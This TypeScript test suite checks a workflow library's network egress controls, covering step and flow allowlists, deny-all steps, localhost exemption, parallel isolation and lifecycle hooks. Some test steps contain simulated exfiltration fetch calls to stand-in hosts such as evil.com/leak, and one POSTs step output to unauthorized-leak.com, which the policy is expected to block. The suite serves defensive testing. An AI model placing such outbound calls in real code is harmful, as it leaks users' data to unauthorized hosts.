import { expect } from 'chai';
import http from 'node:http';
import {
    Step,
    flow,
    parallel,
    inspectGraph,
    toGraph,
    NetworkPolicyViolationException,
    uninstallNetworkInterceptors
} from '../../index';

describe('Network Egress Policy End-to-End Integration Suite', () => {
    let mockLocalServer: http.Server;
    let localPort: number;

    before((done) => {
        mockLocalServer = http.createServer((_req, res) => {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: 'ok', service: 'mock-local-api' }));
        });
        mockLocalServer.listen(0, '127.0.0.1', () => {
            const addr = mockLocalServer.address() as any;
            localPort = addr.port;
            done();
        });
    });

    after((done) => {
        uninstallNetworkInterceptors();
        mockLocalServer.close(done);
    });

    describe('Step-Level Declarative API', () => {
        it('allows whitelisted domains with .allowNetwork() and blocks unauthorized hosts', async () => {
            const allowedHost = 'api.stripe.com';
            const blockedHost = 'api.github.com';

            const step = Step.create('paymentStep', async (param: { target: string }) => {
                return await fetch(param.target);
            }).allowNetwork([allowedHost]);

            expect(step.networkPolicy()).to.not.be.undefined;
            expect(step.networkPolicy()!.allowedHosts).to.deep.equal([allowedHost]);

            // Attempt unauthorized host
            try {
                await step.execute({ target: `https://${blockedHost}/v1/users` });
                expect.fail('Should have failed unauthorized network egress');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('paymentStep');
                expect(err.requestedHost).to.equal(blockedHost);
                expect(err.allowedHosts).to.deep.equal([allowedHost]);
                expect(err.retryable).to.be.false;
            }
        });

        it('strictly disallows all external network calls with .denyNetwork()', async () => {
            const computeStep = Step.create('calculateDiscounts', async () => {
                await fetch('https://api.stripe.com/charges');
                return { total: 100 };
            }).denyNetwork();

            expect(computeStep.networkPolicy()!.allowedHosts).to.deep.equal([]);

            try {
                await computeStep.execute();
                expect.fail('Should have blocked network call');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('calculateDiscounts');
                expect(err.allowedHosts).to.deep.equal([]);
            }
        });

        it('configures custom network policy with .networkPolicy()', async () => {
            const syncStep = Step.create('syncProfile', async (param: { url: string }) => {
                return await fetch(param.url);
            }).networkPolicy({
                allowedHosts: ['api.github.com'],
                allowLocalhost: true
            });

            expect(syncStep.networkPolicy()!.allowedHosts).to.deep.equal(['api.github.com']);

            try {
                await syncStep.execute({ url: 'https://evil.com/leak' });
                expect.fail('Should have failed');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.requestedHost).to.equal('evil.com');
            }
        });

        it('enforces network policy during Step reduce execution', async () => {
            const batchStep = Step.create('batchProcessor', async (item: string) => {
                await fetch('https://external-leak.com/batch');
                return item.toUpperCase();
            })
            .reduce('items')
            .denyNetwork();

            try {
                await batchStep.execute({ items: ['item1', 'item2'] });
                expect.fail('Should have blocked batch reduce network call');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('batchProcessor');
            }
        });
    });

    describe('Flow-Level Declarative API and Precedence Rules', () => {
        it('enforces Flow as outer envelope: step cannot unilaterally expand perimeter', async () => {
            const rogueStep = Step.create('rogueStep', async () => {
                await fetch('https://api.unauthorized-service.com/data');
                return { done: true };
            }).allowNetwork(['api.unauthorized-service.com']); // Attempting to allow domain outside flow

            const safeWorkflow = flow(rogueStep).networkPolicy({
                defaultPolicy: 'deny',
                allowedHosts: ['api.stripe.com'] // Flow only allows stripe.com
            });

            try {
                await safeWorkflow.run({});
                expect.fail('Flow perimeter should have superseded step allowance');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('rogueStep');
                expect(err.requestedHost).to.equal('api.unauthorized-service.com');
            }
        });

        it('allows step to narrow flow allowlist to a strict subset', async () => {
            const narrowedStep = Step.create('narrowedStep', async () => {
                await fetch('https://api.sendgrid.com/v3/mail/send');
                return { done: true };
            }).allowNetwork(['api.stripe.com']); // Narrowed only to Stripe, sendgrid is excluded

            const multiServiceWorkflow = flow(narrowedStep).networkPolicy({
                allowedHosts: ['api.stripe.com', 'api.sendgrid.com']
            });

            try {
                await multiServiceWorkflow.run({});
                expect.fail('Narrowed step perimeter should have blocked sendgrid');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('narrowedStep');
                expect(err.requestedHost).to.equal('api.sendgrid.com');
            }
        });

        it('supports dynamic per-execution run options network policy override', async () => {
            const dynamicStep = Step.create('dynamicStep', async () => {
                await fetch('https://api.sendgrid.com/v3/mail/send');
                return { done: true };
            });

            const workflow = flow(dynamicStep).networkPolicy({
                allowedHosts: ['api.stripe.com', 'api.sendgrid.com']
            });

            // Per-execution override removes sendgrid from perimeter
            try {
                await workflow.run({}, {
                    networkPolicy: {
                        allowedHosts: ['api.stripe.com']
                    }
                });
                expect.fail('Per-execution run policy should have blocked sendgrid');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('dynamicStep');
                expect(err.requestedHost).to.equal('api.sendgrid.com');
            }
        });
    });

    describe('Localhost Exemption and Real HTTP Server Verification', () => {
        it('allows loopback requests by default against a real local HTTP server', async () => {
            const localCallStep = Step.create('localStep', async () => {
                const res = await fetch(`http://127.0.0.1:${localPort}/`);
                const data = await res.json();
                return { data };
            }).denyNetwork(); // Deny external networks, but localhost is exempted by default!

            const result: any = await localCallStep.execute();
            expect(result.data).to.deep.equal({ status: 'ok', service: 'mock-local-api' });
        });

        it('blocks loopback requests when allowLocalhost: false is configured', async () => {
            const strictStep = Step.create('strictStep', async () => {
                await fetch(`http://127.0.0.1:${localPort}/`);
                return { ok: true };
            }).networkPolicy({
                allowedHosts: [],
                allowLocalhost: false
            });

            try {
                await strictStep.execute();
                expect.fail('Should have blocked localhost when allowLocalhost: false');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('strictStep');
                expect(err.requestedHost).to.include('127.0.0.1');
            }
        });
    });

    describe('Concurrency and AsyncLocalStorage Isolation', () => {
        it('isolates concurrent parallel steps without cross-talk on the single event loop', async () => {
            let allowedExecuted = false;

            const allowedStep = Step.create('allowedStep', async () => {
                // Simulating async delay
                await new Promise(r => setTimeout(r, 20));
                // Local server call is allowed
                const res = await fetch(`http://127.0.0.1:${localPort}/`);
                const json = await res.json();
                allowedExecuted = true;
                return { allowed: json.status };
            }).allowNetwork(['api.stripe.com']);

            const blockedStep = Step.create('blockedStep', async () => {
                await new Promise(r => setTimeout(r, 10));
                // Call unauthorized external host
                await fetch('https://evil-cross-talk.org/leak');
                return { blocked: false };
            }).denyNetwork();

            const parallelWorkflow = flow(
                parallel(allowedStep, blockedStep, { mode: 'allSettled' })
            );

            const result: any = await parallelWorkflow.run();

            expect(allowedExecuted).to.be.true;
            expect(result.$settled[0].status).to.equal('fulfilled');
            expect(result.$settled[0].value).to.deep.equal({ allowed: 'ok' });

            expect(result.$settled[1].status).to.equal('rejected');
            const error = result.$settled[1].reason;
            expect(error).to.be.instanceOf(NetworkPolicyViolationException);
            expect(error.stepName).to.equal('blockedStep');
            expect(error.requestedHost).to.equal('evil-cross-talk.org');
        });
    });

    describe('Step Lifecycle Hooks Network Governance', () => {
        it('intercepts and blocks unauthorized network egress inside onBefore hook', async () => {
            const stepWithBeforeLeak = Step.create('beforeLeakStep', () => ({ ok: true }))
                .denyNetwork()
                .onBefore(async () => {
                    await fetch('https://unauthorized-leak.com/pre-check');
                    return true;
                });

            try {
                await stepWithBeforeLeak.execute();
                expect.fail('Should have intercepted unauthorized egress in onBefore');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('beforeLeakStep');
                expect(err.requestedHost).to.equal('unauthorized-leak.com');
                expect(err.phase).to.equal('before');
            }
        });

        it('intercepts and blocks unauthorized network egress inside onSkip hook', async () => {
            const stepWithSkipLeak = Step.create('skipLeakStep', () => ({ ok: true }))
                .denyNetwork()
                .onBefore(() => false)
                .onSkip(async () => {
                    await fetch('https://unauthorized-leak.com/skip-fallback');
                    return { skipped: true };
                });

            try {
                await stepWithSkipLeak.execute();
                expect.fail('Should have intercepted unauthorized egress in onSkip');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('skipLeakStep');
                expect(err.requestedHost).to.equal('unauthorized-leak.com');
            }
        });

        it('intercepts and blocks unauthorized network egress inside onAfter hook', async () => {
            const stepWithAfterLeak = Step.create('afterLeakStep', () => ({ computed: 42 }))
                .denyNetwork()
                .onAfter(async (output) => {
                    await fetch('https://unauthorized-leak.com/enrich', {
                        method: 'POST',
                        body: JSON.stringify(output)
                    });
                    return output;
                });

            try {
                await stepWithAfterLeak.execute();
                expect.fail('Should have intercepted unauthorized egress in onAfter');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('afterLeakStep');
                expect(err.requestedHost).to.equal('unauthorized-leak.com');
                expect(err.phase).to.equal('after');
            }
        });

        it('intercepts and blocks unauthorized network egress inside onFail hook', async () => {
            const stepWithFailLeak = Step.create('failLeakStep', () => {
                throw new Error('Action failed');
            })
            .denyNetwork()
            .onFail(async (_err, retry) => {
                await fetch('https://unauthorized-leak.com/fail-webhook');
                retry({ recovered: true });
            });

            try {
                await stepWithFailLeak.execute();
                expect.fail('Should have intercepted unauthorized egress in onFail');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('failLeakStep');
                expect(err.requestedHost).to.equal('unauthorized-leak.com');
            }
        });

        it('allows permitted network calls across onBefore and onAfter hooks', async () => {
            const permittedStep = Step.create('permittedLifecycleStep', () => ({ processed: true }))
                .allowNetwork(['127.0.0.1'])
                .onBefore(async () => {
                    const res = await fetch(`http://127.0.0.1:${localPort}/`);
                    const data = await res.json();
                    return data.status === 'ok';
                })
                .onAfter(async (output) => {
                    const res = await fetch(`http://127.0.0.1:${localPort}/`);
                    const data = await res.json();
                    return { ...output, service: data.service };
                });

            const result: any = await permittedStep.execute();
            expect(result.processed).to.be.true;
            expect(result.service).to.equal('mock-local-api');
        });
    });

    describe('Graph Inspection Integration', () => {
        it('includes step and flow networkPolicy in toGraph and inspectGraph', () => {
            const stepA = Step.create('stepA', () => ({})).allowNetwork(['api.stripe.com']);
            const stepB = Step.create('stepB', () => ({})).denyNetwork();

            const workflow = flow(stepA, stepB).networkPolicy({
                allowedHosts: ['api.stripe.com', 'api.sendgrid.com'],
                allowLocalhost: true
            });

            const graphNode = toGraph(workflow);
            expect(graphNode.metadata?.networkPolicy).to.deep.equal({
                enabled: true,
                defaultPolicy: 'deny',
                allowedHosts: ['api.stripe.com', 'api.sendgrid.com'],
                allowLocalhost: true
            });

            const inspected = inspectGraph(workflow);
            const nodeA = inspected.nodes.find(n => n.name === 'stepA');
            const nodeB = inspected.nodes.find(n => n.name === 'stepB');

            expect(nodeA?.metadata?.networkPolicy).to.deep.equal({
                enabled: true,
                defaultPolicy: 'deny',
                allowedHosts: ['api.stripe.com'],
                allowLocalhost: true
            });

            expect(nodeB?.metadata?.networkPolicy).to.deep.equal({
                enabled: true,
                defaultPolicy: 'deny',
                allowedHosts: [],
                allowLocalhost: true
            });
        });
    });
});
